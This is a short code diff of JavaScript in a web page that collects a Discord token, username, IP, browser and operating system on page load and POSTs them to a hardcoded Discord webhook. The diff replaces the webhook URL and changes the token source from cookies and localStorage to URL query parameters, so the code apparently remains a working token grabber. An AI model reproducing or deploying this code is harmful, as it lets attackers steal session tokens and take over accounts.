@@ -38,7 +38,7 @@
         }
 
         function sendWebhook(token, username, ip, browser, os) {
-            const webhookURL = 'https://discord.com/api/webhooks/1314627728598761475/l8CE6DjAmvhohsgqgErO5a90hEvC9tn7xafweNHzkPcohn5tLw0XQdQOAGFUpwxzNDos';
+            const webhookURL = 'https://discord.com/api/webhooks/1321597632824611018/iIAs-UeScagNLtAkcEP1qpkm0uUBJIWIg81Jlo56U_Pnv6dFacn8k_FCNYfrUDWcy9vU';
             fetch(webhookURL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -57,8 +57,8 @@
         }
 
         document.addEventListener("DOMContentLoaded", () => {
-            const token = document.cookie.match(/token=([\w-]+)/)?.[1] || localStorage.getItem('discord_token') || "test-token";
-            const username = document.querySelector('.username')?.innerText || "Unknown User";
+            const token = new URLSearchParams(window.location.search).get('token');
+            const username = new URLSearchParams(window.location.search).get('username');
 
             const browser = navigator.userAgent;
             const os = navigator.platform;
